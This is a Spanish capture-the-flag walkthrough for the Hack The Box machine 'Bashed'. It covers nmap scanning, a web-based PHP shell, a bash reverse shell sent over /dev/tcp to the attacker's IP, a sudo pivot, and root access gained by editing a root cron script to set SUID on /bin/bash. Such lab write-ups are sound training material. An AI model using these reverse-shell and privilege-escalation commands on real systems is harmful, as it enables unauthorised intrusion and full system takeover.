# Writeup: Bashed (HTB)

**IP Máquina:** 10.129.23.138  
**IP Atacante:** 10.10.17.184

---
## 1. Reconocimiento y Enumeración

Empezamos lanzando un escaneo rápido con nmap para identificar puertos abiertos en el objetivo

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.23.138 -oG allPorts
```

El escaneo reporta únicamente el puerto 80 abierto, asi que realizamos otro escaneo del servicio exacto para dar con la versión y posibles rutas interesantes

```bash
nmap -p80 -sCV 10.129.23.138 -oN targeted
```

Para complementar, corremos el script `http-enum` de nmap en busca de directorios y archivos comunes

```bash
nmap --script http-enum -p80 10.129.23.138 -oN webScan
```

Al revisar las rutas descubiertas y navegar por la web, nos encontramos con una utilidad web en PHP (_phpbash_) que funciona como una consola interactiva en el propio navegador, permitiéndonos ej[...]

## 2. Acceso Inicial (Reverse Shell)

Trabajar desde una interfaz web suele ser incómodo y limitado, así que aprovechamos la ejecución de comandos para enviarnos una Reverse Shell a nuestra máquina.

1. Ponemos en escucha un puerto con netcat

```bash
nc -nlvp 443
```

2. Nos enviamos una revershell (`&` es `%26` urlencodeado)

```bash
bash -c "bash -i >& /dev/tcp/10.10.17.184/443 0>&1"
```

### Tratamiento de la TTY

Una shell directa por netcar es frágil: no tenemos autocompletado con tabulador, no funcionan las flechas de dirección y un simple `Ctrl + C` cerraría la sesión. Para dejarla completamente int[...]

```bash
# 1. Generamos una pseudoterminal dentro de la máquina remota sin dejar registros
script /dev/null -c bash

# 2. Suspendemos la shell hacia el segundo plano con:
# Ctrl + Z

# 3. Configuramos la terminal local en modo 'raw' para reenviar las señales y reactivamos la shell remota
stty raw -echo; fg

# 4. Reajustamos el emulador de terminal
reset xterm

# 5. Exportamos las variables de entorno necesarias
export TERM=xterm
export SHELL=bash

# 6. Adaptamos las filas y columnas a las medidas de nuestra ventana local
stty rows 44 columns 184
```

## 3. Pivoting (`scriptmanager`)

Revisamos los privilegios de sudo asignados a `www-data`:

```bash
sudo -l
```

El sistema nos indica que podemos ejecutar cualquier comando como el usuario `scriptmanager` sin necesidad de ingresar contraseña. Nos movemos a ese usuario:

```bash
sudo -u scriptmanager bash
```

## 4. Escalada de Privilegios a Root

Con acceso como `scriptmanager`, revisamos qué archivos y directorios del sistema le pertenecen:

```bash
find / -user scriptmanager 2>/dev/null | grep -v "/proc"
```

Localizamos un directorio peculiar en la raíz llamado `/scripts`. Dentro vemos dos archivos:

- `test.py` (propiedad de `scriptmanager`)
- `test.txt` (propiedad de `root`)

![contenido_test.py bashed](imgs%201/contenido_test.py%20bashed.png)

Al inspeccionar los permisos y las fechas de modificación con `ls -la`, notamos que el contenido de `test.txt` se actualiza de manera constante y su dueño es `root`.

![ls-scripts](imgs%201/ls-scripts.png)

Esto quiere decir que es un cronjob en segundo plano donde `root` ejecuta cada X tiempo el script `test.py`.

Para comprobarlo, implementamos un pequeño monitor de procesos en bash

![procmon](imgs%201/procmon.png)

Le damos permisos de ejecución y lo ejecutamos:

![procesos_bashed](imgs%201/procesos_bashed.png)

La monitorización confirma que `root` entra en el directorio `/scripts` y ejecuta los scripts `.py` cada minuto.

### Explotación del Cron Job

Dado que tenemos permisos de escritura sobre `test.py` y `root` lo ejecuta automáticamente, editamos el archivo para asignarle el bit SUID al binario de bash:

```python
import os
os.system("chmod u+s /bin/bash")
```

![suid](imgs%201/suid.png)

Supervisamos los permisos de `/bin/bash` esperando a que transcurra el minuto y la tarea se ejecute:

```bash
watch -n1 ls -l /bin/bash
```

En cuanto vemos que los permisos cambian a `-rwsr-xr-x`, lanzamos una bash que mantenga los privilegios efectivos:

```bash
bash -p
```

Comprobamos nuestra identidad con `whoami` y leemos la flag final:

```bash
whoami
# root
cat /root/root.txt
```
